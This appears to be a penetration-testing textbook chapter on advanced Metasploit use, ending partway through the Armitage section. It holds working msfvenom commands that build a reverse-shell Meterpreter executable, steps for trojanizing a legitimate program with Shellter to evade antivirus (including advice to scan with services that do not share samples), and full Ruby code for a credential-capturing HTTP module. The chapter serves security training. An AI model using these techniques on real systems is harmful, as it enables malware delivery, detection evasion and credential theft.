- en: '*Chapter 7*: Advanced Exploitation with Metasploit'
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Anyone who has been in the field in the last 18 years knows what Metasploit
    can do. There are all kinds of Metasploiters out there, but we’re going to think
    about two kinds in particular. First, you have the intrepid amateur. They downloaded
    Kali Linux and installed it on a **Virtual Machine** (**VM**). Then, they fired
    up Metasploit and learned the basics – how to set an exploit, a payload, and the
    options, and then launch missiles! In this scenario, Metasploit quickly becomes
    the metaphorical hammer, and every problem starts to look like a nail.
  prefs: []
  type: TYPE_NORMAL
- en: On the other hand, there is the seasoned security administrator, who is comfortable
    with the command line. They fire up Metasploit and know how to search for specific
    modules, as well as how to gather the appropriate information to populate options
    fields. However, they feel bound by what’s already there. They recently found
    that they could make their life a lot easier by configuring quick-and-dirty servers
    for capturing packets of a particular protocol, and they wish the same solution
    could be fired up as a module. In this chapter, we will take a look at the more
    advanced uses of Metasploit. Though we only have limited pages to whet our appetites,
    this chapter should provide you with enough content to encourage fruitful research
    beyond these pages.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this chapter, we will cover the following topics:'
  prefs: []
  type: TYPE_NORMAL
- en: Generating and nesting payloads with **msfvenom**
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Working with Shellter
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The inner workings of Metasploit modules
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Working with Armitage
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The social engineering angle
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Technical requirements
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'To get the most out of the hands-on material in this chapter, you’ll need the
    following equipment:'
  prefs: []
  type: TYPE_NORMAL
- en: A laptop running Kali Linux
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Wine32 for Linux
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Shellter
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: A USB thumb drive
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: How to get it right the first time – generating payloads
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: We’ve all seen some people who get their hands on Metasploit and start pulling
    the trigger. If you’re in your lab at home and are just watching what happens,
    that’s fine. If you do that on a professional assessment, you’re likely to get
    caught, setting off alarms without even getting anywhere. After all, pen testing
    isn’t about hacking a sitting duck – your client will have defenses that, for
    the most part, will be pretty solid. If your client isn’t good at prevention,
    they’ll probably be good at detection, and poorly crafted payloads hitting random
    IPs is a no-brainer for a defender. With this in mind, we need to learn how to
    craft our payloads according to the task at hand to maximize our success. The
    more successful we are, the more value we can bring to our client.
  prefs: []
  type: TYPE_NORMAL
- en: Installing Wine32 and Shellter
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Thankfully, Wine32 and Shellter are both included in Kali’s repository, so installing
    them is easy. We always recommend performing a documentation review on everything
    we install, but we particularly suggest it for Shellter.
  prefs: []
  type: TYPE_NORMAL
- en: 'While Wine32 is already installed on Kali, you’ll need to install Wine32 when
    you’re running Kali on a 64-bit system. To install Wine32, enter the following
    command:'
  prefs: []
  type: TYPE_NORMAL
- en: dpkg --add-architecture i386 && apt-get update && apt-get install wine32
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: That’s all it takes! How much you use Wine32 will depend on your needs; if you’re
    out in the field running Linux VMs on a Windows host, you probably won’t take
    Wine32 to its limits. But if you have some flavor of Linux as your home OS, you’ll
    like Wine32’s performance advantages over a VM or emulator environment.
  prefs: []
  type: TYPE_NORMAL
- en: 'To set up Shellter, a native Windows application, use the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: apt-get install shellter
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: And that’s it! You’re now ready to play with Windows executables within Kali
    and dynamically inject evasive shellcode into applications – something we’ll look
    into in more depth in [*Chapter 10*](B17616_10_Final_VK_ePub.xhtml#_idTextAnchor187),
    *Shellcoding - The Stack*.
  prefs: []
  type: TYPE_NORMAL
- en: Payload generation goes solo – working with msfvenom
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Back in the old days, there were separate instances of the Metasploit Framework
    that you could fire up from the command line for generating payloads – they were
    **msfpayload** and **msfencode**. Kids these days can generate payloads with the
    one-stop-shop Metasploit Framework instance called **msfvenom**. Aside from the
    obvious advantage of a single command line with standardized flags for fine-tuning
    your attack, **msfvenom** is also faster.
  prefs: []
  type: TYPE_NORMAL
- en: So, what are payloads? It’s best if we first understand the core structure of
    Metasploit – **modules**. Modules are objects within Metasploit that get a certain
    job done, and the nature of the task defines the type of module. Payloads are
    just a module type within Metasploit, and their job is to contain code for remote
    execution. Payloads are used by exploit modules, which are delivery systems for
    our payload. We will discuss that in more detail later. For now, we’re looking
    at payload generation that can stand alone. This will give you unmatched flexibility
    when you’re in the field.
  prefs: []
  type: TYPE_NORMAL
- en: There are three different kinds of payload – singles, stagers, and stages. Singles
    are the true standalones of the bunch. They don’t even need to talk to Metasploit
    to phone home – you can catch them with a simple **netcat** command. Stagers and
    stages are related but distinct; a stager sets the stage for getting data to and
    from a target. In short, a stager creates a network connection. A stager payload
    is going to execute and then try to phone home, and since the connection is coming
    from inside, we can get around pesky **Network Address Translation** (**NAT**)
    firewalls. Stages are the payload components that are conveyed to the target by
    the stager. Let’s use a very common Meterpreter connect-back example – the Meterpreter
    component itself is the stage, and the module that creates the TCP connection
    back to the attacker is the stager. Of course, there’s no point in phoning home
    if no one is answering, so we must rely on handlers to receive and handle any
    connections.
  prefs: []
  type: TYPE_NORMAL
- en: 'Let’s check out what **msfvenom** offers us when we fire it up in a terminal
    window. Please note that for illustrative purposes, we will define the full names
    of the options. You are welcome to use the shorter flags in practice (for example, **--payload**
    is the same as **-p**):'
  prefs: []
  type: TYPE_NORMAL
- en: msfvenom -h
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Let’s explore some command lines:'
  prefs: []
  type: TYPE_NORMAL
- en: The **--payload** command defines the payload we’re going to use. Think of this
    as a behavior; this is what our payload is going to do. We’ll take a good look
    at specific payloads next.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The **--list** command will output the available modules for a given module
    type. So, let’s say you’re stuck on **–payload**; you can issue **msfvenom --list
    payloads** to get the list. However, if you don’t already know exactly what to
    build, you may need this list of available modules. If you’d rather utilize the
    search function in **msfconsole**, don’t worry – we’ll look at that next.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The **--nopsled** command is a shellcoding option that we will explore in more
    detail in [*Chapter 10*](B17616_10_Final_VK_ePub.xhtml#_idTextAnchor187), *Shellcoding
    - The Stack*.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The **--format** command represents the file type that will be created. This
    is where you’d specify EXE for when you’re making dastardly executables. This
    particular option, however, is an area where the flexibility of **msfvenom** shines,
    as many formats are available. We’ll be looking at a few in this book, but commanding
    **--help-formats** will help you get acquainted.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The **--encoder** command is another option that we’ll dive into in greater
    detail in [*Chapter 10*](B17616_10_Final_VK_ePub.xhtml#_idTextAnchor187), *Shellcoding
    - The Stack*. An encoder can change how code looks without changing the underlying
    functionality. For example, perhaps your payload needs to be encoded in an alphanumeric
    representation, or you need to eliminate characters that break execution. You
    would combine this with **--bad-chars** to get rid of code-breaking characters
    such as **0x00**. How a payload is encoded can be repeated over and over again
    with **--iterations**, which defines the number of passes through the encoder.
    This can make the payload a little stealthier (meaning it’s harder to detect),
    but it’s worth pointing out that encoding isn’t meant to bypass anything – its
    real purpose is to get the code ready for a particular environment.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**--arch** and **--platform** allow you to specify the environment where a
    payload is going to run; for example, 32-bit (instruction set architecture) Windows
    (platform).'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The **--space** command defines the maximum size of your payload in bytes. This
    is handy for situations where you know there is some sort of restriction. Encoded
    payload space is the same unless you want to define it as a different value. In
    this case, you’d use **--encoder-space**. **--smallest** is also useful, which
    generates the smallest possible payload.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**--add-code** allows us to create a *two-for-one* deal by injecting the shellcode
    from a different generated payload into this payload. The source can be an executable
    or it can even be the raw output from a previous run of **msfvenom**. You can
    do this a few times over, potentially embedding several payloads into one. Though
    in reality, you’ll likely run into encoding problems if you do this.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The **--template** command allows you to use an existing executable as a template.
    A Windows executable is made up of many pieces, so you can’t just spit out some
    shellcode on its own – it needs to go somewhere. A template contains everything
    that’s needed to make a working executable – it’s just waiting for you to put
    your shellcode in it. You could also identify a specific executable here if you
    wish, and **msfvenom** will dump your payload into the text section of the executable
    (where general-purpose code that’s been put together by a compiler is located).
    This is powerful on its own, but this option is made all the more covert when
    it’s used in tandem with **--keep**, which keeps the original functionality of
    the template EXE and puts your shellcode in a new thread at execution.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The **--out** command defines the path where our payload gets spat out.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The **--var-name** command will matter to us when we cover shellcoding, but
    even then, it doesn’t do much. It’s really for those who like to stand apart from
    the crowd and use custom output variable names.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The **--timeout** command is a newer feature for generating large payloads;
    it prevents timeouts while the payload is being read. The need for this came about
    from users who were piping the output of **msfvenom** into **msfvenom**. You probably
    won’t use this option, but it’s nice to know it’s there.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Now that we have an idea of the power that this tool provides, it’s time to
    conduct a single attack with two payloads.
  prefs: []
  type: TYPE_NORMAL
- en: Creating nested payloads
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Now, we’re going to prepare a demonstration for a client where the payload will
    display a message to the user that says **You got pwned bro!** while also creating
    a Meterpreter session for the listening handler.
  prefs: []
  type: TYPE_NORMAL
- en: 'There are two payloads, so there are two commands we must use; they are as
    follows:'
  prefs: []
  type: TYPE_NORMAL
- en: msfvenom --arch x86 --platform windows --payload windows/messagebox ICON=INFORMATION
    TITLE="Sorry" TEXT="You got pwned bro! " --format raw > Payload1
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: msfvenom --add-code Payload1 --arch x86 --platform windows --payload windows/meterpreter_reverse_tcp
    LHOST=192.168.108.106 LPORT=4567 --format exe > demo.exe
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'With that, we’ve set the target architecture and platform to 32-bit Windows
    in both commands. In the first command, we set the payload to **windows/messagebox**
    and set the **ICON**, **TITLE**, and **TEXT** payload options. (If you’re going
    to use the exclamation mark, as we’ve done here, put a space after it so that
    you don’t escape the closing quotation marks, or use single quotes.) The format
    is raw binary as we’re going to import it into the next command with the **--add-** code.
    The second payload is **windows/meterpreter_reverse_tcp**, which is a Meterpreter
    session that connects back to us at **LHOST** (in reverse) over a TCP port, which
    we have defined with **LPORT**. Finally, we want to spit out the result in EXE
    format. Be mindful that this is just a demonstration; we would usually recommend
    other combinations of payloads, as message boxes are not exactly stealthy:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 7.1 – The result of our payload’s execution ](image/Figure_7.1_B17616.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 7.1 – The result of our payload’s execution
  prefs: []
  type: TYPE_NORMAL
- en: Although we’ll be looking at the finer points of shellcoding later in this book,
    it’s worth mentioning that combining payloads is bound to put bad characters into
    your masterpiece. You should confirm your result in a test environment, using
    **--bad-chars** to eliminate things such as null bytes, which will almost definitely
    break Windows shellcode. Generating working shellcode isn’t magic, so don’t be
    surprised if certain payloads simply can’t be encoded!
  prefs: []
  type: TYPE_NORMAL
- en: Helter skelter – evading antivirus with Shellter
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Let’s take a look at the following steps:'
  prefs: []
  type: TYPE_NORMAL
- en: 'First, we need to start Shellter. To fire up Shellter, use the following command
    line:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: shellter
  prefs:
  - PREF_IND
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Since we’re total noobs right now, we’ll be using Auto Mode here. Next, we
    need to identify the executable that we’re going to backdoor:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 7.2 – Loading Shellter in Wine32 ](image/Figure_7.2_B17616.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 7.2 – Loading Shellter in Wine32
  prefs: []
  type: TYPE_NORMAL
- en: Aside from ensuring that the executable is 32-bit, a good practice is to use
    an executable that can stand alone. Dependencies on proprietary DLLs often cause
    trouble. You should also verify that the program is considered clean by antivirus
    engines before you inject code into it; false positives are a reality of life
    in the antivirus world, and no amount of stealth during injection will change
    any inherently suspicious behavior.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs: []
  type: TYPE_NORMAL
- en: At the time of writing, x64 injection is possible with the paid version of Shellter.
    Licenses are only for practicing professionals, but if it’s in your budget, I
    recommend supporting the project.
  prefs: []
  type: TYPE_NORMAL
- en: For our demonstration, we’re going to work with an old CD player utility for
    Windows. A 32-bit copy will run on pretty much any Windows system on its own –
    it just needs to be downloaded and executed. While we’re on the subject of picking
    executables for this purpose, we recommend being kind to the community and being
    creative with your work. For example, now that we’ve written this demo with **CDPlayer.exe**,
    it’s out there for the world to see and antivirus engines will have better heuristics
    for it. There’s often a tendency to repeat familiar processes, but it’s better
    to be creative.
  prefs: []
  type: TYPE_NORMAL
- en: After identifying the executable that we’re injecting our payload into, we enter
    **Stealth Mode** and select our payload. As shown in the following screenshot,
    seven of Metasploit’s stagers are built-in.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Shellter will ask you whether you have a custom payload (more on that later),
    but if your needs are covered by one of the existing seven, it’s best to just
    go with what works. In our case, we’re establishing a connect-back Meterpreter
    session, so we’ll go with payload index 1:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 7.3 – Payload selection in Shellter ](image/Figure_7.3_B17616.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 7.3 – Payload selection in Shellter
  prefs: []
  type: TYPE_NORMAL
- en: 'Shellter doesn’t take long once it has all the information it needs. The CD
    player will be injected and left where the original file is. Once the executable
    is on target, the victim fires it up, as shown in the following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 7.4 – The CD player program running on the target PC ](image/Figure_7.4_B17616.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 7.4 – The CD player program running on the target PC
  prefs: []
  type: TYPE_NORMAL
- en: Meanwhile, at our attacking Kali box, the Meterpreter session has received the
    inbound connection and gets to work. This isn’t the most interesting part, though;
    what’s notable here is that the original executable is functioning exactly as
    expected. The CD player works flawlessly while we get to work stealing loot and
    establishing persistence on our target. Cool, huh? Shellter pulls this off by
    analyzing the flow of execution in the legitimate program (done in the tracing
    stage we looked at earlier) and places the shellcode at a natural point in the
    flow. There isn’t a sudden redirection to somewhere else in the code or a weird
    memory request, as you may see in non-dynamically infected executables. The code
    doesn’t look like something was injected into it; the code looks like it was always
    intended to do what it does, which is to provide users with a convenient way to
    play their old 1990s music CDs while quietly giving remote control to a third
    party of their computer.
  prefs: []
  type: TYPE_NORMAL
- en: Establishing control of a target while the user listens to music can be fun,
    but it can also demonstrate the extent of Shellter’s power. For example, when
    we checked the file we generated against the main players in the antivirus market,
    we discovered that we successfully evaded 67% of all vendors. As you can see,
    Shellter incorporates shellcode into the natural flow of execution in such a novel
    way that it can be very difficult to detect.
  prefs: []
  type: TYPE_NORMAL
- en: Be Kind to the Community
  prefs: []
  type: TYPE_NORMAL
- en: If you don’t have a lab already, you may be tempted to play around with your
    creations on one of the many sites offering virus scans or sandboxed VMs for live
    testing. If you’re going to do this, make sure you are working in an environment
    that won’t share your submissions with the antimalware community! You just might
    find that what worked for you on day 1 has suddenly stopped working and that you’ve
    locked yourself out by giving your target too much information. Consider purchasing
    an account with the sandbox vendor so that they can give you a private environment;
    similarly, instead of the popular VirusTotal, consider AntiScan.me or NoDistribute.com
    for scanning and studying the antivirus response to your creations.
  prefs: []
  type: TYPE_NORMAL
- en: It’s important to keep in mind that this result is from a 10-minute demo that
    I put together for this book – there was no fine-tuning involved. Adapting your
    injected Trojan to a specific scenario within your client’s unique environment
    will be crucial. Perhaps your client uses one of the vendors who did *not* detect
    our demo as malicious – or maybe they use one of the other 33%, and you’ll have
    to get back to the drawing board. We’ll cover this kind of fine-tuning in [*Chapter
    10*](B17616_10_Final_VK_ePub.xhtml#_idTextAnchor187), *Shellcoding - The Stack*
  prefs: []
  type: TYPE_NORMAL
- en: Modules – the bread and butter of Metasploit
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: We’ve already been playing around with modules within Metasploit. If it isn’t
    obvious by now, everything that is part of the Metasploit Framework is in its
    modules. Payloads are a kind of module; exploits are another kind of module that
    incorporates payloads. You can have exploit modules without payloads. They are
    known as auxiliary modules. To the uninitiated, it’s easy to think of the exploit
    modules as where the real excitement happens. Nothing feels quite so Hollywood
    as popping a shell after exploiting some obscure software flaw. But when you’re
    out in the field and find that almost all of that juicy pile of vulnerabilities
    isn’t present in client environments, you’ll find yourself relying on auxiliary
    modules instead.
  prefs: []
  type: TYPE_NORMAL
- en: Since we’ve already had a taste of how modules work, let’s look at the core
    of how they work by building one of our own. Although this is just a simple example,
    this will hopefully whet your appetite for more advanced module building later
    on.
  prefs: []
  type: TYPE_NORMAL
- en: Building a simple Metasploit auxiliary module
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: I don’t know about you, but I’m not the biggest fan of Ruby. Although Ruby can
    be awkward at times, module building in Metasploit makes up for it by making the
    process very easy. If you can put together some basic Ruby and understand how
    the different methods work, you can build a module.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this example, we’re throwing together a basic HTTP server that will prompt
    any visitor for credentials. It accomplishes this by kicking back a *401 Unauthorized*
    error to any request, which should prompt just about any browser to ask the user
    for credentials. Once the fake authentication is done, you can redirect the user
    to a URL of your choosing. Let’s look at this module chunk by chunk, starting
    with the following code:'
  prefs: []
  type: TYPE_NORMAL
- en: class MetasploitModule < Msf::Auxiliary
  prefs: []
  type: TYPE_NORMAL
- en: include Msf::Exploit::Remote::HttpServer::HTML
  prefs: []
  type: TYPE_NORMAL
- en: def initialize(info={})
  prefs: []
  type: TYPE_NORMAL
- en: super(update_info(info,
  prefs: []
  type: TYPE_NORMAL
- en: '''Name'' => ''HTTP Server: Basic Auth Credentials Capture'','
  prefs: []
  type: TYPE_NORMAL
- en: '''Description'' => %q{'
  prefs: []
  type: TYPE_NORMAL
- en: Prompt browser to request credentials via a 401 response.
  prefs: []
  type: TYPE_NORMAL
- en: '},'
  prefs: []
  type: TYPE_NORMAL
- en: ))
  prefs: []
  type: TYPE_NORMAL
- en: register_options([
  prefs: []
  type: TYPE_NORMAL
- en: OptString.new('REALM', [ true, "Authentication realm attribute to use.", "Secure
    Site" ]),
  prefs: []
  type: TYPE_NORMAL
- en: OptString.new('redirURL', [ false, "Redirect destination after sending credentials."
    ])
  prefs: []
  type: TYPE_NORMAL
- en: '])'
  prefs: []
  type: TYPE_NORMAL
- en: end
  prefs: []
  type: TYPE_NORMAL
- en: As you can see, once we have created the **MetasploitModule** class, a module
    is being imported with **include**. Modules imported in this way are usually called
    **mixins** as they are grabbing all of the methods from the referenced module
    and mixing them in. This is important to note when you’re building a module or
    even studying a module to learn how it works. If you’re just looking at the inner
    workings of a module, you should check out the mixin code, too. Equally, if you’re
    building a module, don’t reinvent the wheel if you can include a module with core
    functionality. In our example, we’re capturing credentials while posing as an
    HTTP server, so we bring in the abilities of **Msf::Exploit::Remote::HttpServer::HTML**.
  prefs: []
  type: TYPE_NORMAL
- en: Here, the **initialize** method takes **info={}** as an argument and is meant
    to provide general information about the auxiliary module, with **super(update_info())**,
    and then declare the options available to the user with **register_options()**.
    We’re not concerned with the general information for now; however, we are interested
    in the options. Options are user-defined variables known as **datastore options**. **OptString.new()**
    declares a variable of the string class, so we’re now allowing the user to define
    the authentication realm, which redirects the URL after the falsified authentication
    is complete. You may be thinking, *what about localhost and port?*, and you’d
    be right to.
  prefs: []
  type: TYPE_NORMAL
- en: 'Remember that we imported the HTTP server mixin, which already has its port
    and host declared, as shown in the following code:'
  prefs: []
  type: TYPE_NORMAL
- en: def run
  prefs: []
  type: TYPE_NORMAL
- en: '@myhost = datastore[''SRVHOST'']'
  prefs: []
  type: TYPE_NORMAL
- en: '@myport = datastore[''SRVPORT'']'
  prefs: []
  type: TYPE_NORMAL
- en: '@realm = datastore[''REALM'']'
  prefs: []
  type: TYPE_NORMAL
- en: print_status("Listening for connections on
  prefs: []
  type: TYPE_NORMAL
- en: '#{datastore[''SRVHOST'']}:#{datastore[''SRVPORT'']}...")'
  prefs: []
  type: TYPE_NORMAL
- en: Exploit
  prefs: []
  type: TYPE_NORMAL
- en: end
  prefs: []
  type: TYPE_NORMAL
- en: Now, we have to create the **run** method, which is where the module’s functionality
    starts. Some instance variables are declared here using the values stored in the
    defined datastore options, and the user is then advised that we’re firing up a
    quick-and-dirty HTTP server.
  prefs: []
  type: TYPE_NORMAL
- en: 'Normally, the **run** method is where the juicy stuff goes, but in this case,
    we’re leveraging the HTTP server mixin. The real exploit that’s being called is
    just an HTTP server that returns requests and session data when someone connects
    to it. We also define the **on_request_uri()** method so that it does something
    with the returned data, as shown in the following code:'
  prefs: []
  type: TYPE_NORMAL
- en: def on_request_uri(cli, req)
  prefs: []
  type: TYPE_NORMAL
- en: if(req['Authorization'] and req['Authorization'] =~ /basic/i)
  prefs: []
  type: TYPE_NORMAL
- en: basic,auth = req['Authorization'].split(/\s+/)
  prefs: []
  type: TYPE_NORMAL
- en: user,pass = Rex::Text.decode_base64(auth).split(':', 2)
  prefs: []
  type: TYPE_NORMAL
- en: print_good("#{cli.peerhost} - Login captured! \"#{user}:#{pass}\" ")
  prefs: []
  type: TYPE_NORMAL
- en: if datastore['redirURL']
  prefs: []
  type: TYPE_NORMAL
- en: 'print_status("Redirecting client #{cli.peerhost} to #{datastore[''redirURL'']}")'
  prefs: []
  type: TYPE_NORMAL
- en: send_redirect(cli, datastore['redirURL'])
  prefs: []
  type: TYPE_NORMAL
- en: else
  prefs: []
  type: TYPE_NORMAL
- en: send_not_found(cli)
  prefs: []
  type: TYPE_NORMAL
- en: end
  prefs: []
  type: TYPE_NORMAL
- en: else
  prefs: []
  type: TYPE_NORMAL
- en: 'print_status("We have a hit! Sending code 401 to client #{cli.peerhost} now...
    ")'
  prefs: []
  type: TYPE_NORMAL
- en: response = create_response(401, "Unauthorized")
  prefs: []
  type: TYPE_NORMAL
- en: response.headers['WWW-Authenticate'] = "Basic realm=\"#{@realm}\""
  prefs: []
  type: TYPE_NORMAL
- en: cli.send_response(response)
  prefs: []
  type: TYPE_NORMAL
- en: end
  prefs: []
  type: TYPE_NORMAL
- en: end
  prefs: []
  type: TYPE_NORMAL
- en: end
  prefs: []
  type: TYPE_NORMAL
- en: Take a look at the general structure of the previous method. It’s essentially
    an **if...else** statement, which means that it is in reverse chronological order
    of events. This means we expect the initial request to come in, causing us to
    send back the 401 (the **else** statement) before we parse out the credentials
    that are sent back by the browser (the **if** statement). This is done because,
    from the perspective of the HTTP listener, anything that’s sent to the server
    is going to get passed to **on_request_uri()**.
  prefs: []
  type: TYPE_NORMAL
- en: The **if** statement will pass if the request contains an authentication attempt,
    parsing out and decoding the data from the inbound packet, and then displaying
    the captured credentials via **print_good()** (this means the process is a success).
    A nested **if** statement checks whether the user has defined the **redirURL**
    datastore option. If the check passes, an HTTP redirect is sent back; if it fails,
    a 404 is sent back. The **on_request_uri()** method is wrapped up with the **else**
    statement, which is executed if the inbound request is not an authentication attempt.
    An HTTP 401 response is created and sent, pulling the authentication realm from
    its respective datastore option.
  prefs: []
  type: TYPE_NORMAL
- en: Now, it’s time to get our module into Metasploit. The folder where all the modules
    are located is called **/usr/share/metasploit-framework/modules**. Inside this
    folder, you’ll see sub-folders for the different module types. Our demo is an
    auxiliary module, and we’re hosting a server, so ultimately, the path is **/usr/share/metasploit-framework/modules/auxiliary/server**.
  prefs: []
  type: TYPE_NORMAL
- en: Use **cp** or **mv** to get your module from your working folder to that specific
    location, and remember to note the filename of your module. Now, let’s fire up
    **msfconsole** as normal.
  prefs: []
  type: TYPE_NORMAL
- en: The Metasploit Framework will take several seconds to load because it’s checking
    all the modules to make sure they’re ready to rock, including yours. If you don’t
    see any syntax errors and Metasploit starts normally, congratulations – your new
    module made the cut!
  prefs: []
  type: TYPE_NORMAL
- en: Metasploit – Making Life Easier
  prefs: []
  type: TYPE_NORMAL
- en: Getting experience with this manual work is always useful for your understanding
    and development, but Metasploit does allow us to work in module development and
    customization on the fly with the **edit** and **reload** commands. You can edit
    the module within Metasploit, and then use **reload** to make it available in
    your current session.
  prefs: []
  type: TYPE_NORMAL
- en: 'When we issue **use** to load our module, we refer to it by name and by folder
    structure. In our example, the module is called **our_basic_HTTP.rb**, so we called
    it with **auxiliary/server/our_basic_HTTP**. After setting whatever options you
    need, type **exploit**, and you should see something similar to the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 7.5 – Running our module in the Metasploit console ](image/Figure_7.5_B17616.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 7.5 – Running our module in the Metasploit console
  prefs: []
  type: TYPE_NORMAL
- en: 'Check out the flexibility that’s being offered here for today’s SSL world:
    you can negotiate SSL with a custom certificate, something that may come in handy
    when you’re impersonating appliances.'
  prefs: []
  type: TYPE_NORMAL
- en: At this point, we’ve looked at Metasploit from down in the tactical gearbox.
    Now, let’s look at it from a higher, more strategic, perspective.
  prefs: []
  type: TYPE_NORMAL
- en: Efficiency and attack organization with Armitage
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'We shouldn’t consider this a true Metasploit discussion without touching on
    Armitage. Armitage is a graphical frontend environment for Metasploit with a couple
    of huge advantages:'
  prefs: []
  type: TYPE_NORMAL
- en: Armitage allows for more efficient work. Many of the tedious aspects of working
    with a console are reduced, as many tasks can be automated by executing a series
    of actions with a single click. The user interface environment also makes organization
    a snap.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Armitage runs as a team server on a single machine, making it accessible from
    other Armitage clients on the network, which turns the Metasploit Framework into
    a fully fledged red-teaming attack platform. You can even script out your own
    Cortana-based red team bots. Even a single well-versed individual can become terrifying
    with Armitage as an interface to Metasploit.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: We’ll explore Armitage again during post-exploitation, where its power shines.
    For now, let’s take a look at how we can make our Metasploit tasks more project-friendly.
  prefs: []
  type: TYPE_NORMAL
- en: Getting familiar with your Armitage environment
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Our first task is getting Armitage installed. Thankfully, it’s in the repository,
    so using **apt-get install armitage** is all you need. Once that’s done, run the
    **msfdb init** command to initialize the database. Finally, start it up with the
    **armitage** command.
  prefs: []
  type: TYPE_NORMAL
- en: 'The first thing that happens is a logon prompt to an Armitage team server.
    The defaults are all you need for running locally, but this is where you’d punch
    in the details for a team server as part of a red team. Thankfully for us noobs,
    Armitage is pretty friendly and offers to start up the Metasploit RPC server for
    us if we haven’t already, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 7.6 – Armitage offering to start the RPC service ](image/Figure_7.6_B17616.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 7.6 – Armitage offering to start the RPC service
  prefs: []
  type: TYPE_NORMAL
- en: Metasploit’s prompt may feel a little patronizing, but hey, we can’t take these
    things personally.
  prefs: []
  type: TYPE_NORMAL
- en: There are three main windows you’ll work in – **modules**, **targets**, and
    the **tabs** view. As you will see, there’s a full module tree in a friendly drop-down
    folder format, complete with a search bar at the bottom. The **targets** window
    is on the top right, and you’ll see it populate with targets as you get to work.
    At the bottom is **tabs**, where everything you’d normally see at the **msf**
    prompt takes place within tabs corresponding to individual jobs; you’ll also see
    information about things such as services enumerated on a target.
  prefs: []
  type: TYPE_NORMAL
- en: Remember, Armitage is nothing more than a frontend for Metasploit – everything
    it can do, Metasploit can do too. Armitage essentially does all of the typing,
    while providing you with professional-grade attack organization. Of course, you
    can always type down in the console window and do whatever you like, just as you
    would in Metasploit.
  prefs: []
  type: TYPE_NORMAL
- en: The drop-down menu bar at the top has a lot of power, including being your starting
    point for enumerating targets. Let’s take a look.
  prefs: []
  type: TYPE_NORMAL
- en: Enumeration with Armitage
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Navigate to **Hosts** |** Nmap Scan **|** Quick Scan (OS detect)**. Enter the
    scan range, which we have entered here as **192.168.108.0/24**. Watch a new console
    tab called **nmap** pop up and then sit back and relax. You won’t see much happen
    until the scan reports that it’s finished, where the **targets** window will populate
    and the detected OS will be represented, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 7.7 – Recon with Armitage ](image/Figure_7.7_B17616.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 7.7 – Recon with Armitage
  prefs: []
  type: TYPE_NORMAL
- en: You can now conduct a more thorough scan for an individual target and review
    the results of the service’s enumeration. Do this by right-clicking on a host
    and selecting **Services**. A new tab will pop open with a table that’s essentially
    a nicer way of looking at a Nmap version’s scan output.
  prefs: []
  type: TYPE_NORMAL
- en: Now, it’s time to talk about the elephant in the room – the graphical targets
    view. It’s pretty and all, and it makes for a nice Hollywood-hacker-movie demonstration
    for friends, but it isn’t practical in large and busy environments. Thankfully,
